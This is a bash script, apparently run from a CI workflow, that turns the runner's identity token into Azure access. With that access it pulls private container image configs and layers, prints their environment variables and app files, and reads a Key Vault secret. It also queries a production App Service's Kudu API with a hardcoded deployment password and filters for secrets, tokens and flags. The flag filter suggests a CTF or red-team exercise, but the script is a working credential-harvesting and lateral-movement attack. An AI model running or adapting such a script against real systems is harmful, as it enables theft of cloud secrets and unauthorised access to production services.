#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

# ACR token
ACR_RT=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=access_token&service=crtblplatprodx3euoz.azurecr.io&access_token=$ARM" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("refresh_token",""))' 2>/dev/null)
CA_AT=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&scope=repository:catalog-api:pull&refresh_token=$ACR_RT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

echo "=== catalog-api CONFIG BLOB ==="
CONFIG="sha256:8e1ecb2aed6e4fb10e7871c87e696837a46f845327f5cf2565ce5c4cb457ac56"
curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/blobs/$CONFIG" \
  -H "Authorization: Bearer $CA_AT" \
  -o /tmp/config.json
echo "Config blob size: $(wc -c < /tmp/config.json)"
python3 /tmp/config.json 2>/dev/null || true
python3 -c "
import json,sys
with open('/tmp/config.json') as f:
    d=json.load(f)
cfg=d.get('config',{})
print('=== ENV ===')
for e in cfg.get('Env',[]):
    print(' ',e)
print('=== Labels ===')
for k,v in (cfg.get('Labels',{}) or {}).items():
    print(f'  {k}={v}')
print('=== Cmd ===',cfg.get('Cmd',[]))
print('=== Entrypoint ===',cfg.get('Entrypoint',[]))
print('=== WorkingDir ===',cfg.get('WorkingDir',''))
print()
print('=== History (RUN cmds) ===')
for h in d.get('history',[]):
    cb=h.get('created_by','')
    if cb: print(' ',cb[:500])
" 2>&1

echo ""
echo "=== SMALL LAYER EXTRACTION ==="
# Layer 4: 249 bytes - almost certainly just a few bytes with config/env
for DIGEST in \
  "sha256:bbc5a12237474ec0b23b5051260d56d6436a24d70d9cad961adebe7a037ed813" \
  "sha256:bf7f855b9e7297b6be399957aaecce976ae311ca6617ac63a320813000ca68c1" \
  "sha256:5b98a48f74f992383db12481f0e7c3e08dab1b640594c00ccf7e4b511beb6546" \
  "sha256:8c84f1de9ee9641e404a3025d2b6a03792e65daabdb350c5d7e9bd987abfd510"; do

  SHORT="${DIGEST:7:16}"
  echo "--- Layer $SHORT ---"
  curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/blobs/$DIGEST" \
    -H "Authorization: Bearer $CA_AT" \
    -o "/tmp/layer_${SHORT}.tar.gz"
  LS=$(wc -c < "/tmp/layer_${SHORT}.tar.gz")
  echo "Size: $LS bytes"

  # Try to list contents
  tar -tzf "/tmp/layer_${SHORT}.tar.gz" 2>/dev/null && echo "---" || echo "(not tar.gz)"

  # Try to extract and show content
  mkdir -p "/tmp/layer_${SHORT}_extracted"
  tar -xzf "/tmp/layer_${SHORT}.tar.gz" -C "/tmp/layer_${SHORT}_extracted" 2>/dev/null || true
  find "/tmp/layer_${SHORT}_extracted" -type f 2>/dev/null | while read f; do
    echo "FILE: $f"
    file "$f" 2>/dev/null
    cat "$f" 2>/dev/null | head -c 2000
    echo ""
  done
done

echo ""
echo "=== MEDIUM LAYER - app code (layer 4 = 12MB) ==="
LAYER4="sha256:6912e23eb44595b44dc6d9882b34f305ad6f6e9667cec70b13e5dbc4f8cd97f4"
curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/blobs/$LAYER4" \
  -H "Authorization: Bearer $CA_AT" \
  -o /tmp/layer4.tar.gz
echo "Layer4 size: $(wc -c < /tmp/layer4.tar.gz)"
echo "--- Layer4 file listing ---"
tar -tzf /tmp/layer4.tar.gz 2>/dev/null | head -80

echo "--- Look for .py/.sh/.env/.json files ---"
tar -tzf /tmp/layer4.tar.gz 2>/dev/null | grep -E '\.(py|sh|env|json|txt|yaml|yml|conf|cfg)$' | head -40

echo ""
echo "--- Extract and show app files ---"
mkdir -p /tmp/layer4_extracted
tar -xzf /tmp/layer4.tar.gz -C /tmp/layer4_extracted 2>/dev/null || true
find /tmp/layer4_extracted -type f \( -name "*.py" -o -name "*.sh" -o -name "*.env" -o -name "*.json" -o -name "*.yaml" \) 2>/dev/null | while read f; do
  echo "=== FILE: $f ==="
  cat "$f" 2>/dev/null | head -c 3000
  echo ""
done

echo ""
echo "=== CHECK ATTESTATION MANIFEST ==="
ATTEST_DIGEST="sha256:558e99fdd79d07f2dfd39ed269b3cd898a06a9d991d3973fc233a47e2adb6c40"
RA_AT=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&scope=repository:catalog-api:pull&refresh_token=$ACR_RT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/manifests/$ATTEST_DIGEST" \
  -H "Authorization: Bearer $RA_AT" \
  -H "Accept: application/vnd.oci.image.manifest.v1+json" | head -c 3000

echo ""
echo "=== REPORTING APP ENV VIA KUDU PROCESS ==="
# Try Kudu process API to see environment variables of the running app
KV_TOKEN=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
KUDU_USER='$app-tbl-reporting-prod'
KUDU_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'

echo "--- Kudu environment ---"
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/environment" \
  -u "$KUDU_USER:$KUDU_PASS" | python3 -c '
import sys,json
d=json.load(sys.stdin)
env=d.get("environment",{})
for k,v in env.items():
    if any(x in k.upper() for x in ["KEY","SECRET","PASS","TOKEN","CONN","VAULT","STORAGE","IDENTITY","FLAG","DF26","CRED"]):
        print(f"  {k}={v}")
' 2>/dev/null | head -c 3000 || true

echo ""
echo "--- Kudu settings.json ---"
curl -sS "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/settings" \
  -u "$KUDU_USER:$KUDU_PASS" | head -c 3000

echo "DONE"
